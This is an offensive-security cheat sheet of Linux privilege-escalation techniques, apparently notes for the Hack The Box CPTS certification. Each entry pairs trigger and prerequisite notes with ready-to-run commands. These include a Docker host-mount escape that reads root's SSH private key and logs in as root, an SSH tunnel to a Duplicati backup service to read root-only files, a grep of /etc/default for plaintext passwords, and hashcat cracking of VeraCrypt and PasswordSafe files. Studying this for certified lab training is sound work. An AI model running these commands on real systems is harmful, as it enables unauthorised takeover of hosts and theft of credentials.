# Linux Privilege Escalation

### Docker Escape → Host Root SSH Key (HTB CPTS) [added: 2026-04]
- **Tags:** #DockerEscape #ContainerBreakout #SSHKeyTheft #Docker #Linux #PrivEsc #MountEscape
- **Trigger:** Docker socket accessible as current user or running as root inside a Docker container
- **Prereq:** Root inside Docker container with ability to mount host filesystem (docker socket access or privileged container)
- **Yields:** Host root access via stolen SSH private key
- **Opsec:** Low
- **Context:** Running as root inside Docker container. Mount host filesystem and steal root's SSH key.
- **Payload/Method:**
```bash
docker run -v /:/mounted --rm -it alpine:3.13 cat /mounted/root/.ssh/id_rsa
# Save key → chmod 600 id_rsa
ssh root@<HOST_IP> -i id_rsa
```

### Duplicati Backup Service LFI → Read Root Flag (HTB CPTS) [added: 2026-04]
- **Tags:** #Duplicati #BackupAbuse #LFI #SSHTunnel #PortForwarding #Linux #PrivEsc #FileRead
- **Trigger:** Duplicati backup service discovered running on a localhost-only port (commonly 8200)
- **Prereq:** SSH access to the target host + Duplicati service running on a local port
- **Yields:** Arbitrary file read as the Duplicati service user (often root), including sensitive files like /root/flag.txt or /etc/shadow
- **Opsec:** Low
- **Context:** Duplicati service running locally on port 8200. Access via SSH port forwarding. Create a backup job targeting `/root/flag.txt`.
- **Payload/Method:**
```bash
# SSH tunnel (local port 8888 → remote localhost:8200)
ssh -i id_rsa svc_rsync@<TARGET> -L 8888:localhost:8200

# Access in browser: http://127.0.0.1:8888/login.html
# Create new backup: Source = /root/flag.txt, Dest = /tmp
# Run backup → Restore → select /tmp destination
cat /tmp/flag.txt
```

### Credentials in /etc/default/ Files (HTB CPTS) [added: 2026-04]
- **Tags:** #CredentialHunting #PlaintextCreds #EtcDefault #Linux #ConfigFiles #PostExploitation
- **Trigger:** Low-privilege shell obtained on Linux host; searching for plaintext credentials in configuration files
- **Prereq:** Read access to /etc/default/ directory on the target Linux host
- **Yields:** Plaintext service passwords stored in configuration files, enabling lateral movement or privilege escalation
- **Opsec:** Low
- **Context:** Service configuration files in /etc/default/ sometimes contain plaintext passwords.
- **Payload/Method:**
```bash
cat /etc/default/duplicati
grep -r "password\|passwd\|pass" /etc/default/ 2>/dev/null
```

### VeraCrypt Container Cracking (HTB CPTS) [added: 2026-04]
- **Tags:** #VeraCrypt #Hashcat #ContainerCracking #EncryptedVolume #PasswordCracking #Mode13751 #PostExploitation
- **Trigger:** Found a .vc VeraCrypt container file during post-exploitation file enumeration
- **Prereq:** Recovered .vc VeraCrypt container file + hashcat with GPU or sufficient CPU power + wordlist
- **Yields:** Decrypted VeraCrypt volume contents (credentials, documents, keys)
- **Opsec:** Low
- **Context:** Found a `.vc` VeraCrypt container file. Crack with hashcat mode 13751.
- **Payload/Method:**
```bash
hashcat -m 13751 container.vc -a 0 /usr/share/wordlists/rockyou.txt
# After getting password, mount via VeraCrypt GUI on RDP session
```

### PasswordSafe .psafe3 Database Cracking (HTB CPTS) [added: 2026-04]
- **Tags:** #PasswordSafe #Hashcat #psafe3 #PasswordCracking #Mode5200 #VaultCracking #PostExploitation
- **Trigger:** Found a .psafe3 PasswordSafe database file during post-exploitation file enumeration
- **Prereq:** Recovered .psafe3 PasswordSafe database + hashcat with GPU or sufficient CPU power + wordlist
- **Yields:** Master password for the PasswordSafe vault, granting access to all stored credentials
- **Opsec:** Low
- **Context:** Found a `.psafe3` PasswordSafe database. Crack master password with hashcat mode 5200.
- **Payload/Method:**
```bash
hashcat -m 5200 vault.psafe3 /usr/share/wordlists/rockyou.txt
# Open with PasswordSafe app to retrieve stored credentials
```
